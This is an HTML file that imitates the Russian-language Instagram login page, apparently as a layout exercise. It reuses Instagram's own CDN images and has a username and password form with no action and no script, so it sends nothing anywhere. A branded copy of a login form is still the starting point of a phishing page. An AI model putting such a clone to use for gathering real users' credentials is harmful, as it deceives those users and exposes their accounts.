<!DOCTYPE html>
<html lang="ru">
<head>
  <title>Instagram</title>
  <link rel="stylesheet" href="styles.css">
  <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/yr/r/rzWiSjZRxk5.webp" type="image/x-icon">
</head>
<body>
<main>
  <div id="left">
    <div id="center">
      <img id="logo" src="images/logo.png" alt="Logo" />
      <h1>Посмотрите, какими моментами из жизни поделились ваши близкие друзья.</h1>
    </div>
    <img id="imgbelow" src="https://static.cdninstagram.com/rsrc.php/yN/r/-erGonz07kB.webp" />
  </div>
  <div id="right">
    <form>
      <label id="enterlabel">Войти в Instagram</label><br>
      <input type="text" placeholder="Имя пользователя, номер мобильного телефона или электронный адрес"><br>
      <input type="password" placeholder="Пароль"><br>
      <button id="enter" type="submit">Войти</button><br>
      <button id="forgot" type="submit">Забыли пароль?</button><br>
      <div class="empty"></div>
      <button id="facebook" type="submit">Войти через Facebook</button><br>
      <button id="new" type="submit">Создать новый аккаунт</button><br>
      <img id="meta" src="images/meta.png" alt="Meta">
    </form>
  </div>
</main>
<footer>
  <div id="footer1">
    <div>Meta</div>
    <div>Информация</div>
    <div>Блог</div>
    <div>Вакансии</div>
    <div>Помощь</div>
    <div>API</div>
    <div>Конфиденциальность</div>
    <div>Условия</div>
    <div>Места</div>
    <div>Instagram Lite</div>
    <div>Meta AI</div>
    <div>Threads</div>
    <div>Загрузка контактов и лица, не являющиеся пользователями</div>
    <div>Meta Verified</div>
  </div>
  <div id="footer2">
    <div>Русский</div>
    <div>© 2026 Instagram from Meta</div>
  </div>
</footer>
</body>
</html>
